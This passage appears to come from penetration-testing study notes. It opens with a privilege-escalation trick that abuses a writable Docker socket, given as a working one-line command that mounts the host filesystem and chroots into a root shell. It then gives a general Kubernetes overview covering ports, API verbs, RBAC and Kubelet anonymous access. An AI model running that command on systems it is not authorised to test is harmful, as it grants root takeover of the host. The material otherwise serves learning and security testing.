readme.md


<a id="orgce39049"></a>

### Writable Socket

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash


<a id="orgb04cc47"></a>

## Kubernetes

[Kubernetes](https://kubernetes.io/), or `K8s` is a technology that has revolutionized `devops` processes
One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications.

Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`.


<a id="org324a5e2"></a>

### K8s Concept

Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.


<a id="org0c9775a"></a>

### Different between K8 and Docker

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left"><b>Function</b></th>
<th scope="col" class="org-left"><b>Docker</b></th>
<th scope="col" class="org-left"><b>Kubernetes</b></th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left"><code>Primary</code></td>
<td class="org-left">Platform for containerizing Apps</td>
<td class="org-left">An orchestration tool for managing containers</td>
</tr>


<tr>
<td class="org-left"><code>Scaling</code></td>
<td class="org-left">Manual scaling with Docker swarm</td>
<td class="org-left">Automatic scaling</td>
</tr>


<tr>
<td class="org-left"><code>Networking</code></td>
<td class="org-left">Single network</td>
<td class="org-left">Complex network with policies</td>
</tr>


<tr>
<td class="org-left"><code>Storage</code></td>
<td class="org-left">Volumes</td>
<td class="org-left">Wide range of storage options</td>
</tr>
</tbody>
</table>


<a id="org8b73081"></a>

### Architecture

Kubernetes architecture is primarily divided into two types of components:

-   `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
-   `The Worker Nodes` (minions), where the containerized applications are run

1.  Nodes

    The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.

2.  Control Plane

    The Control Plane serves as the management layer. It consists of several crucial components, including:
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-right" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left"><b>Service</b></th>
    <th scope="col" class="org-right"><b>TCP Ports</b></th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">etcd</td>
    <td class="org-right">2379,2380</td>
    </tr>
    
    
    <tr>
    <td class="org-left">API server</td>
    <td class="org-right">6443</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Scheduler</td>
    <td class="org-right">10251</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Controller Manager</td>
    <td class="org-right">10252</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Kubelet API</td>
    <td class="org-right">10250</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Read-Only Kubectl API</td>
    <td class="org-right">10255</td>
    </tr>
    </tbody>
    </table>
    
    These elements enable the `Control Plane` to make decisions and provide a comprehensive view of the entire cluster.

3.  Minions

    Within a containerized environment, the `Minions` (worker nodes) serve as the designated location for running applications. It's important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.
    
    The `Scheduler`, based on the `API server`, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the `etcd`.
    
    Understanding how these components interact is essential for grasping the functioning of Kubernetes. The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.


<a id="org857b77d"></a>

### K8's Security Measures

Kubernetes security can be divided into several domains:

-   Cluster infrastructure security
-   Cluster configuration security
-   Application security
-   Data security

Each domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.


<a id="org206d41e"></a>

### Kubernetes API

The core of Kubernetes architecture is its API that plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.

Each unique resource comes equipped with a distinct set of operations that can be executed, including but not limited to:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left"><b>Request</b></th>
<th scope="col" class="org-left"><b>Description</b></th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">Retrieves information about a resource or a list of resources.</td>
</tr>


<tr>
<td class="org-left">POST</td>
<td class="org-left">Creates a new resource.</td>
</tr>


<tr>
<td class="org-left">PUT</td>
<td class="org-left">Updates an existing resource.</td>
</tr>


<tr>
<td class="org-left">PATCH</td>
<td class="org-left">Applies partial updates to a resource.</td>
</tr>


<tr>
<td class="org-left">DELETE</td>
<td class="org-left">Removes a resource.</td>
</tr>
</tbody>
</table>


<a id="orga533607"></a>

### Authentication

In terms of authentication, Kubernetes supports various methods which serve to verify the user's identity.
Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`). This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources. This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.

In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. 
